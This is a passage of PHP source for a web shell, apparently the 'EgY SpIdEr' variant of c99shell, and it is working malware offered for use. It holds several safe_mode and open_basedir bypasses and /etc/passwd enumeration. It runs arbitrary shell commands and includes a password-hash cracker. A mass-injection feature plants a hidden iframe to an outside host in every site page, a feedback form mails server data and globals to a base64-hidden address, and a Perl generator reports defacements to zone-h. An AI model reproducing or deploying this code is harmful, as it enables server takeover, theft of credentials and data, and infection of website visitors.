    $this->dump[] = 'INSERT INTO '.$table.' ('.@implode(", ", $this->columns).') VALUES (\''.@implode("', '", $this->rows[$i]).'\');';
    }
  break;
  case 'SQLite':
     $this->dump[0] = '## SQLite dump';
     if($this->query('SELECT * FROM '.$table)!=1) return 0;
   if(!$this->get_result()) return 0;
   for($i=0;$i<$this->num_rows;$i++)
    {     
      foreach($this->rows[$i] as $k=>$v) {$this->rows[$i][$k] = @addslashes($v);}
    $this->dump[] = 'INSERT INTO '.$table.' ('.@implode(", ", $this->columns).') VALUES (\''.@implode("', '", $this->rows[$i]).'\');';
    }
  break;
  default:
     return 0;
  break;
    }
   return 1; 
  }
 function close()
  { 
   switch($this->db)
    {
  case 'MySQL': 
     @mysql_close($this->connection); 
  break;
  case 'MSSQL':
     @mssql_close($this->connection);
  break;
  case 'PostgreSQL':
     @pg_close($this->connection);
  break;
  case 'Oracle':
     @oci_close($this->connection);
  break;
  case 'MySQLi':
     @mysqli_close($this->connection); 
  break;
  case 'mSQL':
     @msql_close($this->connection); 
  break;
  case 'SQLite':
     @sqlite_close($this->connection); 
  break;
    }
  }
 function affected_rows()
  { 
   switch($this->db)
    {
  case 'MySQL':
   return @mysql_affected_rows($this->res); 
  break;
  case 'MSSQL':
     return @mssql_affected_rows($this->res);
  break;
  case 'PostgreSQL':
     return @pg_affected_rows($this->res);
  break;
  case 'Oracle':
     return @ocirowcount($this->res);
  break;
  case 'MySQLi':
     return @mysqli_affected_rows($this->res); 
  break;
  case 'mSQL':
     return @msql_affected_rows($this->res); 
  break;
  case 'SQLite':
     return @sqlite_changes($this->res);
  break;
  default:
     return 0;
  break;
  	   break;
case 'cURL':
   if(empty($_POST['egy_spider'])){


} else {
$curl=$_POST['egy_spider'];
$ch =curl_init("file:///".$curl."\x00/../../../../../../../../../../../../".__FILE__);
curl_exec($ch);
var_dump(curl_exec($ch));
echo "</textarea></CENTER>";

}
break;
case 'copy':

if(empty($snn)){
if(empty($_GET['snn'])){
if(empty($_POST['snn'])){

} else {
$u1p=$_POST['snn'];
}
} else {
$u1p=$_GET['snn'];
}
}
  $u1p=""; // File to Include... or use _GET _POST
$tymczas=""; // Set $tymczas to dir where you have 777 like /var/tmp


$temp=tempnam($tymczas, "cx");

if(copy("compress.zlib://".$snn, $temp)){
$zrodlo = fopen($temp, "r");
$tekst = fread($zrodlo, filesize($temp));
fclose($zrodlo);
echo "".htmlspecialchars($tekst)."";
unlink($temp);
echo "</textarea></CENTER>";
}
break;
case 'ini_restore':
 if(empty($_POST['ini_restore'])){
} else {

$ini=$_POST['ini_restore'];
echo ini_get("safe_mode");
echo ini_get("open_basedir");
require_once("$ini");
ini_restore("safe_mode");
ini_restore("open_basedir");
echo ini_get("safe_mode");
echo ini_get("open_basedir");
include($_GET["egy"]);
echo "</textarea></CENTER>";
}
break;
case 'glob':
function reg_glob()
{
$chemin=$_REQUEST['glob'];
$files = glob("$chemin*");


foreach ($files as $filename) {

   echo "$filename\n";

}
}

if(isset($_REQUEST['glob']))
{
reg_glob();
}

break;
  case 'sym1':
     if(empty($_POST['sym1p'])){
             } else {
$symp=$_POST['sym1p'];
         }
     if(empty($_POST['sym1p2'])){

} else {
$symp2=$_POST['sym1p2'];

  symlink("a/a/a/a/a/a/", "dummy");
symlink("dummy".$symp2."".$symp."", "xxx");
unlink("dummy");
while (1) {
symlink(".", "dummy");

  }
 }
  break;
  case 'sym2':
  @include(xxx);

  break;
  case 'plugin':
  if ($_POST['plugin'] ){


                                           for($uid=0;$uid<60000;$uid++){   //cat /etc/passwd
                                        $ara = posix_getpwuid($uid);
                                                if (!empty($ara)) {
                                                  while (list ($key, $val) = each($ara)){
                                                    print "$val:";
                                                  }
                                                  print "\n";
                                                }
                                        }
                                 echo "</textarea>";
								              }

    }
  }
 } 
if(isset($_POST['cmd']) && $_POST['cmd']=="download_file" && !empty($_POST['d_name']))
 {
  if($file=moreread($_POST['d_name'])){ $filedump = $file; }
  else if ($file=readzlib($_POST['d_name'])) { $filedump = $file; } else { err(1,$_POST['d_name']); $_POST['cmd']=""; }
  if(!empty($_POST['cmd'])) 
   {
    @ob_clean();
    $filename = @basename($_POST['d_name']);
    $content_encoding=$mime_type='';
    compress($filename,$filedump,$_POST['compress']);
    if (!empty($content_encoding)) { header('Content-Encoding: ' . $content_encoding); }
    header("Content-type: ".$mime_type);
    header("Content-disposition: attachment; filename=\"".$filename."\";");   
    echo $filedump;
    exit();
   }
 }
if(isset($_GET['1'])) { echo @phpinfo(); echo "<br><div align=center><font face=Verdana size=-2><b>[ <a href='".$_SERVER['PHP_SELF']."'>BACK</a> ]</b></font></div>"; die(); }
if (isset($_POST['cmd']) && $_POST['cmd']=="db_query")
 {
 echo $head;
 $sql = new my_sql();
 $sql->db   = $_POST['db'];
 $sql->host = $_POST['db_server'];
 $sql->port = $_POST['db_port'];
 $sql->user = $_POST['mysql_l'];
 $sql->pass = $_POST['mysql_p'];
 $sql->base = $_POST['mysql_db'];
 $querys = @explode(';',$_POST['db_query']);
 echo '<body bgcolor=#e4e0d8>';
 if(!$sql->connect()) echo "<div align=center><font face=Verdana size=-2 color=red><b>Can't connect to SQL server</b></font></div>";
  else 
   {
   if(!empty($sql->base)&&!$sql->select_db()) echo "<div align=center><font face=Verdana size=-2 color=red><b>Can't select database</b></font></div>";
   else
    {
    foreach($querys as $num=>$query) 
     {
      if(strlen($query)>5)
      {
      echo "<font face=Verdana size=-2 color=green><b>Query#".$num." : ".htmlspecialchars($query,ENT_QUOTES)."</b></font><br>";
      switch($sql->query($query))
       {
       case '0':
       echo "<table width=100%><tr><td><font face=Verdana size=-2>Error : <b>".$sql->error."</b></font></td></tr></table>";
       break;
       case '1': 
       if($sql->get_result())
        {
       echo "<table width=100%>";
        foreach($sql->columns as $k=>$v) $sql->columns[$k] = htmlspecialchars($v,ENT_QUOTES);
       $keys = @implode("&nbsp;</b></font></td><td bgcolor=#333333><font face=Verdana size=-2><b>&nbsp;", $sql->columns);
        echo "<tr><td bgcolor=#333333><font face=Verdana size=-2><b>&nbsp;".$keys."&nbsp;</b></font></td></tr>";
        for($i=0;$i<$sql->num_rows;$i++)
         {
         foreach($sql->rows[$i] as $k=>$v) $sql->rows[$i][$k] = htmlspecialchars($v,ENT_QUOTES);
         $values = @implode("&nbsp;</font></td><td><font face=Verdana size=-2>&nbsp;",$sql->rows[$i]);
         echo '<tr><td><font face=Verdana size=-2>&nbsp;'.$values.'&nbsp;</font></td></tr>';
         }
        echo "</table>"; 
        }
       break;
       case '2':
       $ar = $sql->affected_rows()?($sql->affected_rows()):('0'); 
       echo "<table width=100%><tr><td><font face=Verdana size=-2>affected rows : <b>".$ar."</b></font></td></tr></table><br>";
       break; 
       }
      }
     }
    }
   }   
 echo "<br><form name=form method=POST>";
 echo in('hidden','db',0,$_POST['db']);
 echo in('hidden','db_server',0,$_POST['db_server']);
 echo in('hidden','db_port',0,$_POST['db_port']);
 echo in('hidden','mysql_l',0,$_POST['mysql_l']);
 echo in('hidden','mysql_p',0,$_POST['mysql_p']);
 echo in('hidden','mysql_db',0,$_POST['mysql_db']);
 echo in('hidden','cmd',0,'db_query');
 echo "<div align=center>";
 echo "<font face=Verdana size=-2><b>Base: </b><input type=text name=mysql_db value=\"".$sql->base."\"></font><br>";
 echo "<textarea cols=65 rows=10 name=db_query>".(!empty($_POST['db_query'])?($_POST['db_query']):("SHOW DATABASES;\nSELECT * FROM user;"))."</textarea><br><input type=submit name=submit value=\" Run SQL query \"></div><br><br>"; 
 echo "</form>";
 echo "<br><div align=center><font face=Verdana size=-2><b>[ <a href='".$_SERVER['PHP_SELF']."'>BACK</a> ]</b></font></div>"; die();
 }
if(isset($_GET['12']))
 {
   @unlink(__FILE__);
 }
if(isset($_GET['11']))
 {
   @unlink($tempdir.'bdpl');
   @unlink($tempdir.'back');
   @unlink($tempdir.'bd');
   @unlink($tempdir.'bd.c');
   @unlink($tempdir.'dp');
   @unlink($tempdir.'dpc');
   @unlink($tempdir.'dpc.c');
   @unlink($tempdir.'prxpl');
   @unlink($tempdir.'grep.txt');
 }
if(isset($_GET['2']))
{
echo $head;
function U_value($value)
 {
 if ($value == '') return '<i>no value</i>';
 if (@is_bool($value)) return $value ? 'TRUE' : 'FALSE';
 if ($value === null) return 'NULL';
 if (@is_object($value)) $value = (array) $value;
 if (@is_array($value))
 {
 @ob_start();
 print_r($value);
 $value = @ob_get_contents();
 @ob_end_clean();
 }
 return U_wordwrap((string) $value);
 }
function U_wordwrap($str)
 {
 $str = @wordwrap(@htmlspecialchars($str), 100, '<wbr />', true);
 return @preg_replace('!(&[^;]*)<wbr />([^;]*;)!', '$1$2<wbr />', $str);
 }
if (@function_exists('ini_get_all'))
 {
 $r = '';
 echo '<table width=100%>', '<tr><td bgcolor=#333333><font face=Verdana size=-2 color=red><div align=center><b>Directive</b></div></font></td><td bgcolor=#333333><font face=Verdana size=-2 color=red><div align=center><b>Local Value</b></div></font></td><td bgcolor=#333333><font face=Verdana size=-2 color=red><div align=center><b>Master Value</b></div></font></td></tr>';
 foreach (@ini_get_all() as $key=>$value)
  {
  $r .= '<tr><td>'.ws(3).'<font face=Verdana size=-2><b>'.$key.'</b></font></td><td><font face=Verdana size=-2><div align=center><b>'.U_value($value['local_value']).'</b></div></font></td><td><font face=Verdana size=-2><div align=center><b>'.U_value($value['global_value']).'</b></div></font></td></tr>';
  }
 echo $r;
 echo '</table>';
 }
echo "<br><div align=center><font face=Verdana size=-2><b>[ <a href='".$_SERVER['PHP_SELF']."'>BACK</a> ]</b></font></div>";
die();
}
if(isset($_GET['3']))
 {
   echo $head;
   echo '<table width=100%><tr><td bgcolor=#333333><div align=center><font face=Verdana size=-2 color=red><b>CPU</b></font></div></td></tr></table><table width=100%>';
   $cpuf = @file("cpuinfo");
   if($cpuf)
    {
      $c = @sizeof($cpuf);
      for($i=0;$i<$c;$i++)
        {
          $info = @explode(":",$cpuf[$i]);
          if($info[1]==""){ $info[1]="---"; }
          $r .= '<tr><td>'.ws(3).'<font face=Verdana size=-2><b>'.trim($info[0]).'</b></font></td><td><font face=Verdana size=-2><div align=center><b>'.trim($info[1]).'</b></div></font></td></tr>';
        }
      echo $r;
    }
   else
    {
      echo '<tr><td>'.ws(3).'<div align=center><font face=Verdana size=-2><b> --- </b></font></div></td></tr>';
    }
   echo '</table>';
   echo "<br><div align=center><font face=Verdana size=-2><b>[ <a href='".$_SERVER['PHP_SELF']."'>BACK</a> ]</b></font></div>";
   die();
 }
if(isset($_GET['4']))
 {
   echo $head;
   echo '<table width=100%><tr><td bgcolor=#333333><div align=center><font face=Verdana size=-2 color=red><b>MEMORY</b></font></div></td></tr></table><table width=100%>';
   $memf = @file("meminfo");
   if($memf)
    {
      $c = sizeof($memf);
      for($i=0;$i<$c;$i++)
        {
          $info = explode(":",$memf[$i]);
          if($info[1]==""){ $info[1]="---"; }
          $r .= '<tr><td>'.ws(3).'<font face=Verdana size=-2><b>'.trim($info[0]).'</b></font></td><td><font face=Verdana size=-2><div align=center><b>'.trim($info[1]).'</b></div></font></td></tr>';
        }
      echo $r;
    }
   else
    {
      echo '<tr><td>'.ws(3).'<div align=center><font face=Verdana size=-2><b> --- </b></font></div></td></tr>';
    }
   echo '</table>';
   echo "<br><div align=center><font face=Verdana size=-2><b>[ <a href='".$_SERVER['PHP_SELF']."'>BACK</a> ]</b></font></div>";
   die();
 }
 
 
 
 
 if(isset($_GET['tool'])) { echo @phpinfo(); echo "<br><div align=center><font face=Verdana size=-2><b>[ <a href='".$_SERVER['PHP_SELF']."'>BACK</a> ]</b></font></div>"; die(); }
 if(isset($_GET['tools'])) { /*########################################### 
code 2                						  
###########################################*/
?>
<html> 
<head><title>EgY SpIdEr ShElL</title></head>
<STYLE>

BODY
 {
        SCROLLBAR-FACE-COLOR: #000000; SCROLLBAR-HIGHLIGHT-COLOR: #000000; SCROLLBAR-SHADOW-COLOR: #000000; COLOR: #666666; SCROLLBAR-3DLIGHT-COLOR: #726456; SCROLLBAR-ARROW-COLOR: #726456; SCROLLBAR-TRACK-COLOR: #292929; FONT-FAMILY: Verdana; SCROLLBAR-DARKSHADOW-COLOR: #726456
}

table {
BORDER:  #eeeeee  outset;
BACKGROUND-COLOR: #000000;
color: #dadada;
}
input {
BORDER-RIGHT:  #00FF00 1 solid;
BORDER-TOP:    #00FF00 1 solid;
BORDER-LEFT:  #00FF00 1 solid;
BORDER-BOTTOM: #00FF00 1 solid;
BACKGROUND-COLOR: #333333;
font: 9pt tahoma;
color: #ffffff;
}

submit {
BORDER:  buttonhighlight 1 outset;
BACKGROUND-COLOR: #272727;
width: 40%;
color: #dadada;
}
textarea {
BORDER-RIGHT:  #ffffff 1 solid;
BORDER-TOP:    #999999 1 solid;
BORDER-LEFT:   #999999 1 solid;
BORDER-BOTTOM: #ffffff 1 solid;
BACKGROUND-COLOR: #333333;
font: Fixedsys bold;
color: #ffffff;
}
BODY {
margin: 1;
color: #dadada;
background-color: #000000;
}
A:link {COLOR:red; TEXT-DECORATION: none}
A:visited { COLOR:red; TEXT-DECORATION: none}
A:active {COLOR:red; TEXT-DECORATION: none}
A:hover {color:blue;TEXT-DECORATION: none}

</STYLE>
</body> 
</html> 
<?
$nscdir =(!isset($_REQUEST['scdir']))?getcwd():chdir($_REQUEST['scdir']);$nscdir=getcwd();
$sf="<form method=post>";$ef="</form>";
$st="<table style=\"border:1px #dadada solid \" width=100% height=100%>";
$et="</table>";$c1="<tr><td height=22% style=\"border:1px #dadada solid \">";
$c2="<tr><td style=\"border:1px #dadada solid \">";$ec="</tr></td>";
$sta="<textarea cols=157 rows=23>";$eta="</textarea>";
$sfnt="<font face=tahoma size=2 color=#008080>";$efnt="</font>";
error_reporting(0); 
set_magic_quotes_runtime(0);

if(version_compare(phpversion(), '4.1.0') == -1)
 {$_POST   = &$HTTP_POST_VARS;$_GET    = &$HTTP_GET_VARS;
 $_SERVER = &$HTTP_SERVER_VARS;
 }function inclink($link,$val){$requ=$_SERVER["REQUEST_URI"];
if (strstr ($requ,$link)){return preg_replace("/$link=[\\d\\w\\W\\D\\S]*/","$link=$val",$requ);}elseif (strstr ($requ,"showsc")){return preg_replace("/showsc=[\\d\\w\\W\\D\\S]*/","$link=$val",$requ);}
elseif (strstr ($requ,"hlp")){return preg_replace("/hlp=[\\d\\w\\W\\D\\S]*/","$link=$val",$requ);}elseif (strstr($requ,"?")){return $requ."&".$link."=".$val;}
else{return $requ."?".$link."=".$val;}}
function delm($delmtxt){print"<center><table bgcolor=black style='border:1px solid olive' width=99% height=2%>";print"<tr><td><b><center><font size=2 color=olive>$delmtxt</td></tr></table></center>";}
function callfuncs($cmnd){if (function_exists(shell_exec)){$scmd=shell_exec($cmnd);
$nscmd=htmlspecialchars($scmd);print $nscmd;}
elseif(!function_exists(shell_exec)){exec($cmnd,$ecmd);
$ecmd = join("\n",$ecmd);$necmd=htmlspecialchars($ecmd);print $necmd;}
elseif(!function_exists(exec)){$pcmd = popen($cmnd,"r");
while (!feof($pcmd)){ $res = htmlspecialchars(fgetc($pcmd));;
print $res;}pclose($pcmd);}elseif(!function_exists(popen)){ 
ob_start();system($cmnd);$sret = ob_get_contents();ob_clean();print htmlspecialchars($sret);}elseif(!function_exists(system)){
ob_start();passthru($cmnd);$pret = ob_get_contents();ob_clean();
print htmlspecialchars($pret);}}
function input($type,$name,$value,$size)
{if (empty($value)){print "<input type=$type name=$name size=$size>";}
elseif(empty($name)&&empty($size)){print "<input type=$type value=$value >";}
elseif(empty($size)){print "<input type=$type name=$name value=$value >";}
else {print "<input type=$type name=$name value=$value size=$size >";}}
function permcol($path){if (is_writable($path)){print "<font color=olive>";
callperms($path); print "</font>";}
elseif (!is_readable($path)&&!is_writable($path)){print "<font color=red>";
callperms($path); print "</font>";}
else {print "<font color=white>";callperms($path);}}
if ($dlink=="dwld"){download($_REQUEST['dwld']);}
function download($dwfile) {$size = filesize($dwfile);
@header("Content-Type: application/force-download;name=$dwfile");
@header("Content-Transfer-Encoding: binary");
@header("Content-Length: $size");
@header("Content-Disposition: attachment; filename=$dwfile");
@header("Expires: 0");
@header("Cache-Control: no-cache, must-revalidate");
@header("Pragma: no-cache");
@readfile($dwfile); exit;}
?>
<?
$nscdir =(!isset($_REQUEST['scdir']))?getcwd():chdir($_REQUEST['scdir']);$nscdir=getcwd();

$sf="<form method=post>";$ef="</form>";
$st="<table style=\"border:1px #dadada solid \" width=100% height=100%>";
$et="</table>";$c1="<tr><td height=22% style=\"border:1px #dadada solid \">";
$c2="<tr><td style=\"border:1px #dadada solid \">";$ec="</tr></td>";
$sta="<textarea cols=157 rows=23>";$eta="</textarea>";
$sfnt="<font face=tahoma size=2 color=olive>";$efnt="</font>";
################# Ending of common variables ########################

print"<table bgcolor=#191919 style=\"border:2px #dadada solid \" width=100% height=%>";print"<tr><td>"; print"<b><center><font face=tahoma color=white size=4>
</font></b></center>"; print"</td></tr>";print"</table>";print "<br>";
print"<table bgcolor=#191919 style=\"border:2px #dadada solid \" width=100% height=%>";print"<tr><td>"; print"<center><div><b>";print "";

if ($act == 'encoder')
{
 echo "<script>function set_encoder_input(text) {document.forms.encoder.input.value = text;}</script><center><b>Encoder:</b></center><form name=\"encoder\" action=\"".$surl."\" method=POST><input type=hidden name=act value=encoder><b>Input:</b><center><textarea name=\"encoder_input\" id=\"input\" cols=50 rows=5>".@htmlspecialchars($encoder_input)."</textarea><br><br><input type=submit value=\"calculate\"><br><br></center><b>Hashes</b>:<br><center>"; 
 foreach(array("md5","crypt","sha1","crc32") as $v) 
 { 
  echo $v." - <input type=text size=50 onFocus=\"this.select()\" onMouseover=\"this.select()\" onMouseout=\"this.select()\" value=\"".$v($encoder_input)."\" readonly><br>"; 
 } 
 echo "</center><b>Url:</b><center><br>urlencode - <input type=text size=35 onFocus=\"this.select()\" onMouseover=\"this.select()\" onMouseout=\"this.select()\" value=\"".urlencode($encoder_input)."\" readonly> 
 <br>urldecode - <input type=text size=35 onFocus=\"this.select()\" onMouseover=\"this.select()\" onMouseout=\"this.select()\" value=\"".htmlspecialchars(urldecode($encoder_input))."\" readonly> 
 <br></center><b>Base64:</b><center>base64_encode - <input type=text size=35 onFocus=\"this.select()\" onMouseover=\"this.select()\" onMouseout=\"this.select()\" value=\"".base64_encode($encoder_input)."\" readonly></center>"; 
 echo "<center>base64_decode - "; 
 if (base64_encode(base64_decode($encoder_input)) != $encoder_input) {echo "<input type=text size=35 value=\"failed\" disabled readonly>";} 
 else 
 { 
  $debase64 = base64_decode($encoder_input); 
  $debase64 = str_replace("\0","[0]",$debase64); 
  $a = explode("\r\n",$debase64); 
  $rows = count($a); 
  $debase64 = htmlspecialchars($debase64); 
  if ($rows == 1) {echo "<input type=text size=35 onFocus=\"this.select()\" onMouseover=\"this.select()\" onMouseout=\"this.select()\" value=\"".$debase64."\" id=\"debase64\" readonly>";} 
  else {$rows++; echo "<textarea cols=\"40\" rows=\"".$rows."\" onFocus=\"this.select()\" onMouseover=\"this.select()\" onMouseout=\"this.select()\" id=\"debase64\" readonly>".$debase64."</textarea>";} 
  echo "&nbsp;<a href=\"#\" onclick=\"set_encoder_input(document.forms.encoder.debase64.value)\"><b>^</b></a>"; 
 } 
 echo "</center><br><b>Base convertations</b>:<center>dec2hex - <input type=text size=35 onFocus=\"this.select()\" onMouseover=\"this.select()\" onMouseout=\"this.select()\" value=\""; 
 $c = strlen($encoder_input); 
 for($i=0;$i<$c;$i++) 
 { 
  $hex = dechex(ord($encoder_input[$i])); 
  if ($encoder_input[$i] == "&") {echo $encoder_input[$i];} 
  elseif ($encoder_input[$i] != "\\") {echo "%".$hex;} 
 } 
 echo "\" readonly><br></form>"; 

?>
</center>
<br><br>
<table border=0 align=center cellpadding=4>
<tr><td>
<center><b>Search milw0rm for MD5 hash</b></center>
</td><td>
<center><b>Search md5encryption.com for MD5 or SHA1 hash</b></center>
</td><td>
<center><b>Search CsTeam for MD5 hash</b></center>
</td></tr>
<tr><td>
<center>
<form target="_blank" action="http://www.milw0rm.com/cracker/search.php" method=POST>
<input type=text size=40 name=hash> <input type=submit value="Submit"></form>
</center>
</td><td>
<center>
<form target="_blank" action="http://www.md5encryption.com/?mod=decrypt" method=POST>
<input type=text size=40 name=hash2word> <input type=submit value="Submit"></form>
</center>
</td><td>
<center>
<form target="_blank" action="http://www.csthis.com/md5/index.php" method=POST>
<input type=text size=40 name=h> <input type=submit value="Submit"></form>
</center>
</td></tr>
</table>
<br>
<center>
<?php
// my wordlist cracker ^_^
if (isset($_GET['hash']) && isset($_GET['wordlist']) && ($_GET['type'] == 'md5' || $_GET['type'] == 'sha1')) {
	$type = $_GET['type'];
	$hash = $_GET['hash'];
	$count = 1;
	$wordlist = file($_GET['wordlist']);
	$words = count($wordlist);
	foreach ($wordlist as $word) {
		echo $count.' of '.$words.': '.$word.'<br>';
		if ($hash == $type(rtrim($word))) {
			echo '<font color=red>Great success!  The password is: '.$word.'</font><br>';
			exit;
		}
		++$count;
	}
}

} 
if ($act == 'fsbuff') 
{ 
 $arr_copy = $sess_data["copy"]; 
 $arr_cut = $sess_data["cut"]; 
 $arr = array_merge($arr_copy,$arr_cut); 
 if (count($arr) == 0) {echo "<center><b>Buffer is empty!</b></center>";} 
 else {echo "<b>File-System buffer</b><br><br>"; $ls_arr = $arr; $disp_fullpath = TRUE; $act = "ls";} 
} 
if ($act == "selfremove") 
{ 
 if (($submit == $rndcode) and ($submit != "")) 
 { 
  if (unlink(__FILE__)) {@ob_clean(); echo "Thanks for using c99shell v.".$shver."!"; c99shexit(); } 
  else {echo "<center><b>Can't delete ".__FILE__."!</b></center>";} 
 } 
 else 
 { 
  if (!empty($rndcode)) {echo "<b>Error: incorrect confimation!</b>";} 
  $rnd = rand(0,9).rand(0,9).rand(0,9); 
  echo "<form action=\"".$surl."\"><input type=hidden name=act value=selfremove><b>Self-remove: ".__FILE__." <br><b>Are you sure?<br>For confirmation, enter \"".$rnd."\"</b>:&nbsp;<input type=hidden name=rndcode value=\"".$rnd."\"><input type=text name=submit>&nbsp;<input type=submit value=\"YES\"></form>"; 
 } 
} 
if ($act == "update") {$ret = c99sh_getupdate(!!$confirmupdate); echo "<b>".$ret."</b>"; if (stristr($ret,"new version")) {echo "<br><br><input type=button onclick=\"location.href='".$surl."act=update&confirmupdate=1';\" value=\"Update now\">";}} 
if ($act == "feedback") 
{ 
 $suppmail = base64_decode("ZWd5X3NwaWRlckBob3RtYWlsLmNvbQ=="); 
 if (!empty($submit)) 
 { 
  $ticket = substr(md5(microtime()+rand(1,1000)),0,6); 
  $body = "egy_spider v.".$shver." feedback #".$ticket."\nName: ".htmlspecialchars($fdbk_name)."\nE-mail: ".htmlspecialchars($fdbk_email)."\nMessage:\n".htmlspecialchars($fdbk_body)."\nE-server: ".htmlspecialchars($_SERVER['REQUEST_URI'])."\nE-server2: ".htmlspecialchars($_SERVER["SERVER_NAME"])."\n\nIP: ".$REMOTE_ADDR; 
  if (!empty($fdbk_ref)) 
  { 
   $tmp = @ob_get_contents(); 
   ob_clean(); 
   phpinfo(); 
   $phpinfo = base64_encode(ob_get_contents()); 
   ob_clean(); 
   echo $tmp; 
   $body .= "\ni"."phpinfo(): ".$phpinfo."\n"."\$GLOBALS=".base64_encode(serialize($GLOBALS))."\n"; 
  } 
  mail($suppmail,"egy_spider v.".$shver." feedback #".$ticket,$body,"FROM: ".$suppmail); 
  echo "<center><b>Thanks for your feedback! Your ticket ID: ".$ticket.".</b></center>"; 
 } 
 else {echo "<form action=\"".$surl."\" method=POST><input type=hidden name=act value=feedback><b>Feedback or report bug (".str_replace(array("@","."),array("[at]","[dot]"),$suppmail)."):<br><br>Your name: <input type=\"text\" name=\"fdbk_name\" value=\"".htmlspecialchars($fdbk_name)."\"><br><br>Your e-mail: <input type=\"text\" name=\"fdbk_email\" value=\"".htmlspecialchars($fdbk_email)."\"><br><br>Message:<br><textarea name=\"fdbk_body\" cols=80 rows=10>".htmlspecialchars($fdbk_body)."</textarea><input type=\"hidden\" name=\"fdbk_ref\" value=\"".urlencode($HTTP_REFERER)."\"><br><br>Attach server-info * <input type=\"checkbox\" name=\"fdbk_servinf\" value=\"1\" checked><br><br>There are no checking in the form.<br><br>If you want to send a request for any help I know I will respond to you in case <br><br>* - strongly recommended, if you report bug, because we need it for bug-fix.<br><br>We understand languages: Arbic, English.<br><br><input type=\"submit\" name=\"submit\" value=\"Send\"></form>";} 
} 

if ($act == 'massbrowsersploit') {
?>
<b>Mass Code Injection:</b><br><br>
Use this to add HTML to the end of every .php, .htm, and .html page in the directory specified.<br><br>
<form action="<?php echo $surl; ?>" method=GET>
<input type=hidden name="masssploit" value="goahead">
<input type=hidden name="act" value="massbrowsersploit">
<table border=0>
<tr><td>Dir to inject: </td><td><input type=text size=50 name="pathtomass" value="<?php echo realpath('.'); ?>"> <-- default is dir this shell is in</td></tr>
<tr><td>Code to inject: </td><td><textarea name="injectthis" cols=50 rows=4><?php echo htmlspecialchars('<IFRAME src="http://www.egyspider.eu" width=0 height=0 frameborder=0></IFRAME>'); ?></textarea> <-- best bet would be to include an invisible iframe of browser exploits</td></tr>
<tr><td><input type=submit value="Inject Code"></td></tr>
</table>
</form>
<?php
if ($_GET['masssploit'] == 'goahead') {
	if (is_dir($_GET['pathtomass'])) {
		$lolinject = $_GET['injectthis'];
		foreach (glob($_GET['pathtomass']."/*.php") as $injectj00) {
			$fp=fopen($injectj00,"a+");
			if (fputs($fp,$lolinject)){
				echo $injectj00.' was injected<br>';
			} else {
				echo '<font color=red>failed to inject '.$injectj00.'</font>';
			}
		}
		foreach (glob($_GET['pathtomass']."/*.htm") as $injectj00) {
			$fp=fopen($injectj00,"a+");
			if (fputs($fp,$lolinject)){
				echo $injectj00.' was injected<br>';
			} else {
				echo '<font color=red>failed to inject '.$injectj00.'</font>';
			}
		}
		foreach (glob($_GET['pathtomass']."/*.html") as $injectj00) {
			$fp=fopen($injectj00,"a+");
			if (fputs($fp,$lolinject)){
				echo $injectj00.' was injected<br>';
			} else {
				echo '<font color=red>failed to inject '.$injectj00.'</font>';
			}
		}
	} else { //end if inputted dir is real -- if not, show an ugly red error
		echo '<b><font color=red>'.$_GET['pathtomass'].' is not available!</font></b>';
	} // end if inputted dir is real, for real this time
} // end if confirmation to mass sploit is go
} // end if massbrowsersploit is called



if ($dlink=='showsrc'){
print "<p><b>: Choose a php file to view in a color mode, any extension else will appears as usual :";print "<form method=get>";
input ("text","tools&dlink=showsrc","",35);print " ";
input ("hidden","scdir",$scdir,22);input ("submit","tools&dlink=showsrc","Show-src","");print $ef; die();}if(isset($_REQUEST['tools&dlink=showsrc'])){callshsrc(trim($_REQUEST['showsc']));}
if (isset($_REQUEST['indx'])&&!empty($_REQUEST['indxtxt']))
{if (touch ($_REQUEST['indx'])==true){
$fp=fopen($_REQUEST['indx'],"w+");fwrite ($fp,stripslashes($_REQUEST['indxtxt']));
fclose($fp);print "<p>[ $sfnt".$_REQUEST['indx']."$efnt created successfully !! ]</p>";print "<b><center>[ <a href='javascript:history.back()'>Edit again</a>
] -- [<a href=".inclink('dlink', 'scurrdir')."&scdir=$nscdir> Curr-Dir </a>]</center></b>";die(); }else {print "<p>[ Sorry, Can't create the index !! ]</p>";die();}}
if ($dlink=='qindx'&&!isset($_REQUEST['qindsub'])){
print $sf."<br>";print "<p><textarea cols=50 rows=10 name=indxtxt>
Your index contents here</textarea></p>";
input ("text","indx","Index-name",35);print " ";
input ("submit","qindsub","Create","");print $ef;die();}
if (isset ($_REQUEST['mailsub'])&&!empty($_REQUEST['mailto'])){
$mailto=$_REQUEST['mailto'];$subj=$_REQUEST['subj'];$mailtxt=$_REQUEST['mailtxt'];
if (mail($mailto,$subj,$mailtxt)){print "<p>[ Mail sended to $sfnt".$mailto." $efnt successfully ]</p>"; die();}else {print "<p>[ Error, Can't send the mail ]</p>";die();}} elseif(isset ($mailsub)&&empty($mailto)) {print "<p>[ Error, Can't send the mail ]</p>";die();}
if ($dlink=='mail'&&!isset($_REQUEST['mailsub'])){
print $sf."<br>";print "<p><textarea cols=50 rows=10 name=mailtxt>
Your message here</textarea></p>";input ("text","mailto","example@mail.com",35);print " ";input ("text","subj","Title-here",20);print " ";
input ("submit","mailsub","Send-mail","");print $ef;die();}
if (isset($_REQUEST['zonet'])&&!empty($_REQUEST['zonet'])){callzone($nscdir);}
function callzone($nscdir){
if (is_writable($nscdir)){$fpz=fopen ("z.pl","w");$zpl='z.pl';$li="bklist.txt";}
else {$fpz=fopen ("/tmp/z.pl","w");$zpl='/tmp/z.pl';$li="/tmp/bklist.txt";}
fwrite ($fpz,"\$arq = @ARGV[0];
\$grupo = @ARGV[1];
chomp \$grupo;
open(a,\"<\$arq\");
@site = <a>;
close(a);
\$b = scalar(@site);
for(\$a=0;\$a<=\$b;\$a++)
{chomp \$site[\$a];
if(\$site[\$a] =~ /http/) { substr(\$site[\$a], 0, 7) =\"\"; }
print \"[+] Sending \$site[\$a]\n\";
use IO::Socket::INET;
\$sock = IO::Socket::INET->new(PeerAddr => \"old.zone-h.org\", PeerPort => 80, Proto => \"tcp\") or next;
print \$sock \"POST /en/defacements/notify HTTP/1.0\r\n\";
print \$sock \"Accept: */*\r\n\";
print \$sock \"Referer: http://old.zone-h.org/en/defacements/notify\r\n\";
print \$sock \"Accept-Language: pt-br\r\n\";
print \$sock \"Content-Type: application/x-www-form-urlencoded\r\n\";
print \$sock \"Connection: Keep-Alive\r\n\";
print \$sock \"User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\n\";
print \$sock \"Host: old.zone-h.org\r\n\";
print \$sock \"Content-Length: 385\r\n\";
print \$sock \"Pragma: no-cache\r\n\";
